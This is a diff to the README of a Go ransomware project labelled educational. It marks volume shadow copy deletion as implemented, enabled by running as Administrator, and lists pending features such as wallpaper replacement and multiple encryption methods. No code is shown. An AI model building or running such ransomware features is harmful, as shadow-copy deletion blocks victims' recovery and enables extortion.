@@ -29,7 +29,8 @@ This is a basic ransomware project framework for educational purposes, designed 
 
 **TODO (Pending Features):**
 
-1. Volume shadow copy deletion
+~~1. Volume shadow copy deletion~~
+
 2. Desktop wallpaper replacement (resource section attempted but failed)
 3. Multiple encryption method implementations
 4. Multi-folder polling
@@ -97,5 +98,8 @@ go run ./cmd/client/main.go
 ```
 
 #### 5.2 Build Executable
+
+(run as Administrator can use delete_shadow!)
+
 ```bash
 go build ./cmd/client/main.go
